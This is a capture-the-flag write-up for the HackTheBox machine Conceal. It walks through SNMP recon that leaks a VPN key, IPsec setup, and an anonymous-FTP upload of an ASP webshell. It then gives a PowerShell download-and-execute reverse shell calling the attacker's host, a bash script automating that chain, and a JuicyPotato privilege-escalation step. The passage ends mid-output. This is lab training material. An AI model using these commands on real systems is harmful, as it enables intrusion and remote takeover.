---
title: HTB: Conceal
url: https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
date: 2019-05-18T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: ctf, hackthebox, htb-conceal, nmap, snmp, snmpwalk, ike, ipsec, ike-scan, strongswan, iis, gobuster, webshell, upload, nishang, juicypotato, potato, watson, windows, windows10, htb-mischief, htb-bounty, oscp-like-v2, oscp-like-v1
---

![Conceal-cover](https://0xdfimages.gitlab.io/img/conceal-cover.png)

Conceal brought something to HTB that I hadn’t seen before - connecting via an IPSEC VPN to get access to the host. I’ll use clues from SNMP and a lot of guessing and trial and error to get connected, and then it’s a relatively basic Windows host, uploading a webshell over FTP, and then using JuicyPotato to get SYSTEM priv. The box is very much unpatched, so I’ll show Watson as well, and leave exploiting those vulnerabilities as an exercise for the reader. It actually blows my mind that it only took 7 hours for user first blood, but then an additional 16.5 hours to root.

## Box Info

| Name | [Conceal](https://hackthebox.com/machines/conceal)  [Conceal](https://hackthebox.com/machines/conceal) [Play on HackTheBox](https://hackthebox.com/machines/conceal) |
| --- | --- |
| Release Date | [05 Jan 2019](https://twitter.com/hackthebox_eu/status/1080753334502469632) |
| Retire Date | 18 May 2019 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Conceal |
| Radar Graph | Radar chart for Conceal |
| First Blood User | 07:00:14[braindamaged braindamaged](https://app.hackthebox.com/users/38653) |
| First Blood Root | 23:36:41[stefano118 stefano118](https://app.hackthebox.com/users/3603) |
| Creator | [bashlogic bashlogic](https://app.hackthebox.com/users/1545) |

## Recon

### nmap

#### Initial Scans

I’ll start with an `nmap` scan, and surprisingly, get no tcp ports back. I always run the udp scan as well (though often don’t show it here when it’s empty or not important), and I find one open port, IPSEC:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-13 16:34 EST
Nmap scan report for 10.10.10.116
Host is up (0.017s latency).
All 65535 scanned ports on 10.10.10.116 are filtered

Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-13 16:37 EST
Nmap scan report for 10.10.10.116
Host is up (0.019s latency).
Not shown: 65534 open|filtered ports
PORT    STATE SERVICE
500/udp open  isakmp

Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds

```

#### More UDP

But I don’t have enough information to connect to a VPN yet. There has to be more enumeration. After double checking that there really are no TCP ports open, I turned back to UDP. `nmap` on UDP can be very unreliable, as there’s not handshake to say the port is definitely open. So if the port just doesn’t respond, you don’t know if it is filtered or open just awaiting different input. For example, when I scan ports 160-165, it returns all `open|filtered` (even though 161 is actually open, as I’ll discover momentarily):

```

root@kali# nmap -sU -p 160-165 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-14 01:54 EDT
Nmap scan report for 10.10.10.116
Host is up (0.096s latency).

PORT    STATE         SERVICE
160/udp open|filtered sgmp-traps
161/udp open|filtered snmp
162/udp open|filtered snmptrap
163/udp open|filtered cmip-man
164/udp open|filtered smip-agent
165/udp open|filtered xns-courier

Nmap done: 1 IP address (1 host up) scanned in 2.36 seconds

```

I’ll run `nmap` on the top 20 ports with standard scripts enabled. The scripts are more likely to get a responses from an open port. It works:

```

root@kali# nmap -sU -sC --top-ports 20 -oA nmap/udp-top20-scripts 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-14 01:46 EDT
Nmap scan report for 10.10.10.116
Host is up (0.11s latency).      
                                             
PORT      STATE         SERVICE  
53/udp    open|filtered domain       
67/udp    open|filtered dhcps           
68/udp    open|filtered dhcpc                                                                                                                 
69/udp    open|filtered tftp     
123/udp   open|filtered ntp          
135/udp   open|filtered msrpc                 
137/udp   open|filtered netbios-ns                             
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open          snmp                     
| snmp-interfaces:                                             
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel(R) 82574L Gigabit Network Connection\x00
|     IP address: 10.10.10.116  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b2:68:88 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 1.69 Mb sent, 2.53 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b2:68:88 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 1.69 Mb sent, 2.54 Mb received
|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
|     MAC address: 00:50:56:b2:68:88 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 1.69 Mb sent, 2.54 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b2:68:88 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 1.69 Mb sent, 2.54 Mb received
| snmp-netstat:
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   TCP  10.10.10.116:49676   10.10.14.15:443
|   TCP  10.10.10.116:49682   10.10.14.15:443
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  0.0.0.0:51681        *:*
|   UDP  0.0.0.0:54275        *:*
|   UDP  0.0.0.0:59047        *:*
|   UDP  0.0.0.0:65166        *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:54399   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:54400      *:*
| snmp-processes:               
|   1:                                           
|     Name: System Idle Process                                
|   4:
|     Name: System  
...[snip]...
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open          isakmp
| ike-version: 
|   vendor_id: Microsoft Windows 8
|   attributes: 
|     MS NT5 ISAKMPOAKLEY
|     RFC 3947 NAT-T
|     draft-ietf-ipsec-nat-t-ike-02\n
|     IKE FRAGMENTATION
|     MS-Negotiation Discovery Capable
|_    IKE CGA version 1
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
Service Info: OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 62.12 seconds

```

Not only do I find SNMP open, but also get a `netstat` showing a bunch of open TCP ports, full process list, etc.

### SNMP - UDP 161

Knowing that snmp is open, I’ll use `snmpwalk` with the standard parameters:

```

root@kali# snmpwalk -v 2c -c public 10.10.10.116
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 63 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (83409) 0:13:54.09
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
iso.3.6.1.2.1.2.1.0 = INTEGER: 15
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2
...[snip]...

```

There’s a few interesting bits in this data, but the most important information is right at the top: `"IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"`.

I could look up [iso.3.6.1.2.1.1.4 and see that it is sysContact](https://www.alvestrand.no/objectid/1.3.6.1.2.1.1.4.html), but it’s easier if I just enable MIB support for `snmpwalk` (for details, see the [Mischief post](/2019/01/05/htb-mischief.html#background)), and run that again:

```

root@kali# snmpwalk -v 2c -c public 10.10.10.116
SNMPv2-MIB::sysDescr.0 = STRING: Hardware: Intel64 Family 6 Model 63 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.311.1.1.3.1.1
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (502332) 1:23:43.32
SNMPv2-MIB::sysContact.0 = STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
SNMPv2-MIB::sysName.0 = STRING: Conceal
SNMPv2-MIB::sysLocation.0 = STRING: 
SNMPv2-MIB::sysServices.0 = INTEGER: 76
IF-MIB::ifNumber.0 = INTEGER: 15
IF-MIB::ifIndex.1 = INTEGER: 1
IF-MIB::ifIndex.2 = INTEGER: 2
...[snip]...

```

I have a password and possibly a name. That password is actually a hash, and it cracks (via crackstation):

![1547429741317](https://0xdfimages.gitlab.io/img/1547429741317.png)

### IKE - UDP 500

UDP 500 is used for Internet Key Exchange (IKE), which is used to establish an IPSEC VPN. There is some recon I can do on the IKE using `ike-scan`:

```

root@kali# ike-scan -M 10.10.10.116
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.10.116    Main Mode Handshake returned
        HDR=(CKY-R=053b51683e85c566)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
        VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
        VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
        VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
        VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
        VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
        VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

Ending ike-scan 1.9.4: 1 hosts scanned in 0.047 seconds (21.40 hosts/sec).  1 returned handshake; 0 returned notify

root@kali# ike-scan -M --ikev2 10.10.10.116
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)

Ending ike-scan 1.9.4: 1 hosts scanned in 2.457 seconds (0.41 hosts/sec).  0 returned handshake; 0 returned notify

```

Things I take from that:
- The Internet Key Exchange (IKE) is encrypted with triple DES, using SHA1 hash, and modp1024.
- Auth is Preshared Key (PSK)
- The IKE is v1, not v2.

## Cnnecting to IPSEC VPN

### Background

#### IPSEC

Internet Protocol Security (IPSEC) is a suite of tools that are used for securing network traffic at the IP layer. There are two protocols that provide different security assurances:
- Authentication Header (AH) - Provides data integrity (will know if data is modified between senders), data source authentication (will know if the source isn’t what is expected for that connection), and protects against replay attacks.
- Encapsulating Security Payloads (ESP) - Provides similar capabilities, plus confidentiality (someone in the middle can’t see the data).

There’s also something called Security Associations (SA) which provide a bundle of algorithms to dynamically exchange keys and establish a secure connection over AH or ESP. IKE is one of those.

#### Modes

Both ESP and AH can operate in two modes:
- Transport mode - Provides security services between two hosts, applied to the payload of the IP packet, but the IP headers are left in the clear for routing.
- Tunneling - The entire IP packet is encrypted and/or authenticated, and it become the payload of a new IP packet with a header to send it to the other end. At the other end, the packet is encrypted and send based on the decrpyted headers.

![transport vs tunnel](https://0xdfimages.gitlab.io/img/conceal-ipsec-modes.jpg)

Given it seems unlikely there’s a network behind this host, I’m going to guess I’ll need Transport mode for this host.

### Install strongswan

I’ll use the `strongswan` client to connect to the VPN. I’ll install it with:

```

apt install strongswan

```

### Build Config Files

I’ll need to edit `/etc/ipsec.conf` and `/etc/ipsec.secrets` to connect. [This reference](https://wiki.strongswan.org/projects/strongswan/wiki/Strongswanconf) has details on the `ipsec.conf` file.

[This post](https://blog.ruanbekker.com/blog/2018/02/11/setup-a-site-to-site-ipsec-vpn-with-strongswan-and-preshared-key-authentication/) is a good starting point for building my conf files.

First the `ipsec.secrets` file:

```

# This file holds shared secrets or RSA private keys for authentication.

%any : PSK "Dudecake1!"

```

Next, `ipsec.conf`:

```

# ipsec.conf - strongSwan IPsec configuration file

config setup
    charondebug="all"
    uniqueids=yes
    strictcrlpolicy=no

conn conceal
    authby=secret
    auto=add
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=transport
    keyexchange=ikev1
    left=10.10.14.15
    right=10.10.10.116
    rightsubnet=10.10.10.116[tcp]

```
- `charondebug="all"` - be more verbose to help me troubleshoot the connection.
- `authby="secret"` - use PSK auth.
- `ike`, `esp`, and `keyexchange` are set based on information from `ike-scan`.
- `left` and `right` represent my computer and the target computer.
- `type=transport` - use ipsec transport mode to connect host to host.

A lot of these options took a lot of trial and error to get right. It’d be difficult to walk through all the failed connections I made and the number of guesses I had to make to get a working config (it was a lot, especially given that even with debug output, the feedback is weak). I will show one such case. I originally had the config above without `[tcp]` on `rightsubnet`.

When I try to connect without that, it would return this:

```

root@kali# ipsec up conceal 
initiating Main Mode IKE_SA conceal[1] to 10.10.10.116
generating ID_PROT request 0 [ SA V V V V V ]
sending packet: from 10.10.14.15[500] to 10.10.10.116[500] (176 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.15[500] (208 bytes)
parsed ID_PROT response 0 [ SA V V V V V V ]
received MS NT5 ISAKMPOAKLEY vendor ID
received NAT-T (RFC 3947) vendor ID
received draft-ietf-ipsec-nat-t-ike-02\n vendor ID
received FRAGMENTATION vendor ID
received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
generating ID_PROT request 0 [ KE No NAT-D NAT-D ]
sending packet: from 10.10.14.15[500] to 10.10.10.116[500] (244 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.15[500] (260 bytes)
parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]
generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]
sending packet: from 10.10.14.15[500] to 10.10.10.116[500] (100 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.15[500] (68 bytes)
parsed ID_PROT response 0 [ ID HASH ]
IKE_SA conceal[1] established between 10.10.14.15[10.10.14.15]...10.10.10.116[10.10.10.116]
scheduling reauthentication in 9889s
maximum IKE_SA lifetime 10429s
generating QUICK_MODE request 3521357586 [ HASH SA No ID ID ]
sending packet: from 10.10.14.15[500] to 10.10.10.116[500] (164 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.15[500] (76 bytes)
parsed INFORMATIONAL_V1 request 676698584 [ HASH N(INVAL_ID) ]
received INVALID_ID_INFORMATION error notify
establishing connection 'conceal' failed

```

There’s no direct feedback from the box that tells me need to connect such that I only tunnel TCP. That said, if you think about it, I’m already able to connect to to UDP ports, so it makes sense that only the TCP ports are protected behind the IPSEC connection.

### Connection

Once I have the correct configuration in place, it will connect:

```

root@kali# ipsec restart 
Stopping strongSwan IPsec...
Starting strongSwan 5.7.2 IPsec [starter]...
root@kali# ipsec up conceal 
initiating Main Mode IKE_SA conceal[1] to 10.10.10.116
generating ID_PROT request 0 [ SA V V V V V ]
sending packet: from 10.10.14.15[500] to 10.10.10.116[500] (176 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.15[500] (208 bytes)
parsed ID_PROT response 0 [ SA V V V V V V ]
received MS NT5 ISAKMPOAKLEY vendor ID
received NAT-T (RFC 3947) vendor ID
received draft-ietf-ipsec-nat-t-ike-02\n vendor ID
received FRAGMENTATION vendor ID
received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
generating ID_PROT request 0 [ KE No NAT-D NAT-D ]
sending packet: from 10.10.14.15[500] to 10.10.10.116[500] (244 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.15[500] (260 bytes)
parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]
generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]
sending packet: from 10.10.14.15[500] to 10.10.10.116[500] (100 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.15[500] (68 bytes)
parsed ID_PROT response 0 [ ID HASH ]
IKE_SA conceal[1] established between 10.10.14.15[10.10.14.15]...10.10.10.116[10.10.10.116]
scheduling reauthentication in 10078s
maximum IKE_SA lifetime 10618s
generating QUICK_MODE request 2936760209 [ HASH SA No ID ID ]
sending packet: from 10.10.14.15[500] to 10.10.10.116[500] (164 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.15[500] (188 bytes)
parsed QUICK_MODE response 2936760209 [ HASH SA No ID ID ]
selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
CHILD_SA conceal{1} established with SPIs c17de99e_i d3321544_o and TS 10.10.14.15/32 === 10.10.10.116/32[tcp]
generating QUICK_MODE request 2936760209 [ HASH ]
sending packet: from 10.10.14.15[500] to 10.10.10.116[500] (60 bytes)
connection 'conceal' established successfully

```

## Recon Over IPSEC

With the VPN connected, I can start recon over again and see a lot more.

### nmap

This time, `nmap` shows more ports, clearly a Windows host, matching what I saw in SNMP:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp_vpn 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-14 08:33 EST
Warning: 10.10.10.116 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.116
Host is up (0.018s latency).
Not shown: 65338 closed ports, 185 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.97 seconds

root@kali# nmap -sT -p 21,80,135,139,445 -sC -sV -oA nmap/scripts_vpn 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-14 08:36 EST
Nmap scan report for 10.10.10.116
Host is up (0.018s latency).

PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7m33s, deviation: 0s, median: -7m33s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-01-14 08:28:55
|_  start_date: 2019-01-13 18:55:33

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds

```

### Web - TCP 80

#### Site

The site is just the IIS default page, as I showed above. Not much to explore here.

![1547472711488](https://0xdfimages.gitlab.io/img/1547472711488.png)

#### gobuster

Running `gobuster` reveals `/upload`:

```

root@kali# gobuster -u http://10.10.10.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,aspx,asp,html -o gobuster-txt_aspx_asp_html_23small.txt        

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.116/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,aspx,asp,html
[+] Timeout      : 10s
=====================================================
2019/01/14 08:39:29 Starting gobuster
=====================================================
/upload (Status: 301)
/Upload (Status: 301)
=====================================================
2019/01/14 09:47:03 Finished
=====================================================

```

Directory listing is on, but no files:

![1547475875476](https://0xdfimages.gitlab.io/img/1547475875476.png)

### FTP - TCP 21

`nmap` reported that FTP allows anonymous login. The ftp root is empty:

```

root@kali# ftp 10.10.10.116
Connected to 10.10.10.116.
220 Microsoft FTP Service
Name (10.10.10.116:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.

```

I can put and delete files too:

```

root@kali# cat 0xdf.txt 
test

```

```

ftp> put 0xdf.txt
local: 0xdf.txt remote: 0xdf.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
6 bytes sent in 0.00 secs (10.4074 kB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-14-19  02:12PM                    6 0xdf.txt
226 Transfer complete.
ftp> del 0xdf.txt
250 DELE command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.

```

## Shell as destitute

### Verify Upload to Web

At this point I’ll form a hypothesis that the FTP root is the same folder as the web uploads folder. To test this, I’ll upload a txt file, and then see if it shows up on the web.

```

ftp> put 0xdf.txt
local: 0xdf.txt remote: 0xdf.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
6 bytes sent in 0.00 secs (11.0763 kB/s)

```

![1547476177085](https://0xdfimages.gitlab.io/img/1547476177085.png)

### Find Language / Webshell

A webserver can be configured to handle different kinds of scripts. Some will run php, others asp, or aspx. Often I can see something in the HTTP response headers that will give me a clue. In this case, I don’t see anything that will help:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Fri, 12 Oct 2018 22:10:28 GMT
Accept-Ranges: bytes
ETag: "abe052627862d41:0"
Server: Microsoft-IIS/10.0
Date: Mon, 13 May 2019 06:36:04 GMT
Connection: close
Content-Length: 696

```

I’ll try a few shells and see what happens. If I try to upload a php or aspx shell, I get this error on visiting the page:

![1547476784114](https://0xdfimages.gitlab.io/img/1547476784114.png)

But if I upload a simple asp shell, it works:

```

root@kali# cat /opt/shells/asp/cmd.asp 
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

```

```

ftp> put /opt/shells/asp/cmd.asp 0xdf.asp
local: /opt/shells/asp/cmd.asp remote: 0xdf.asp
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
100 bytes sent in 0.00 secs (5.6098 MB/s)

```

```

root@kali# curl http://10.10.10.116/upload/0xdf.asp?cmd=whoami
conceal\destitute

```

### Interactive Shell

From Webshell, it’s time to get an interactive shell. I’ll go with my Windows stand-by, Nishang `Invoke-PowerShellTcp.ps1`.
1. Make a copy of it in the local directory.
2. Add a line to the end: `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 443`
3. Start `python3 -m http.server 80` in that same directory
4. Start `nc -lnvp 443`
5. Visit: `http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.15/Invoke-PowerShellTcp.ps1%27)`

First the webserver is hit to get `Invoke-PowerShellTcp.ps1`:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.116 - - [14/Jan/2019 09:49:41] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

```

Then `nc` gets the callback:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.116.
Ncat: Connection from 10.10.10.116:49675.
Windows PowerShell running as user CONCEAL$ on CONCEAL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\SysWOW64\inetsrv>whoami
conceal\destitute

```

From there, grab the user flag, named `proof.txt`:

```

PS C:\users\destitute\desktop> dir

    Directory: C:\users\destitute\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/10/2018     23:58             32 proof.txt

PS C:\users\destitute\desktop> type proof.txt
6E9FDFE0...

```

### Script It

Because the connection sometimes dies, and I like to be able to pick up where I left off, I scripted the shell process. I give a port and my current IP, and it will start the python webserver, upload the webshell over ftp, use curl to trigger the webshell to request my shell, and then kill the webserver. All I have to do is open nc in another window to catch the callback.

```

  1 #!/bin/bash
  2 
  3 function usage {
  4     echo "Usage: $0 [ip] [port] [powershell file]"
  5     echo "Include ip and port for webserver, and path to file to iex on server"
  6     exit
  7 }
  8 
  9 if [ "$#" -ne 3 ]; then
 10     usage
 11 fi;
 12 
 13 ip=$1
 14 port=$2
 15 file=$3
 16 
 17 if [ ! -f ${file} ]; then
 18     echo "[-] ${file} not found"
 19     usage
 20 fi;
 21 
 22 # update ip in reverse shell
 23 sed -i "s/-IPAddress 10.10.14.[[:digit:]]\{1,3\}/-IPAddress ${ip}/" ${file}
 24 
 25 echo "[*] Starting Web Server on port $port"
 26 python3 -m http.server $port &
 27 WEB_PID=$!
 28 
 29 sleep 1  # let webserver start
 30 echo [*] Restarting IPsec VPN
 31 ipsec restart 2>/dev/null
 32 sleep 1  # wait for restart to finish
 33 ipsec up conceal | grep successfully || echo "Failed to connect IPSec VPN"
 34 
 35 echo [*] FTPing webshell to target
 36 echo '<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>' > /tmp/cmd.asp
 37 ftp -n 10.10.10.116 <<End-of-Session >/dev/null
 38 user anonymous pass 
 39 del 0xdf.asp
 40 put /tmp/cmd.asp 0xdf.asp
 41 bye
 42 End-of-Session
 43 rm /tmp/cmd.asp
 44 
 45 echo "[*] Triggering shell. Webserver should be listening on 80"
 46 curl "http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://${ip}/${file}%27)" &
 47 
 48 sleep 4  # wait for target to connect to webserver
 49 echo "[*] Killing web server"
 50 kill -9 $WEB_PID
 51 echo "[*] Should have shell on netcat"
 52 
 53 sleep 5 # wait for error messages on failure

```

Here it is in action:

![](https://0xdfimages.gitlab.io/img/conceal-shell.gif)

## Privesc to System

### Enumeration

Checking `whoami /priv` shows I have `SeImpresonatePrivilege`:

```

PS C:\users\Destitute\appdata\local\temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

That means I can use potato.

### JuicyPotato

Get the latest [JuicyPotato](https://github.com/ohpe/juicy-potato/releases) and upload it:

```

PS C:\users\Destitute\appdata\local\temp> invoke-webrequest -uri http://10.10.14.15:81/juicypotato.exe -outfile jp.exe

```

I’ll also create a `rev.bat` that runs the same command I issued to the webshell:

```

powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.15/Invoke-PowerShellTcp.ps1')

```

Now I need to get a valid CLSID. Based on the `systeminfo` I can see it’s Windows 10 Enterprise:

```

PS C:\Windows\SysWOW64\inetsrv>systeminfo

Host Name:                 CONCEAL
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.15063 N/A Build 15063
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00329-00000-00003-AA343
Original Install Date:     12/10/2018, 20:04:27
System Boot Time:          13/05/2019, 06:42:20
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 05/04/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
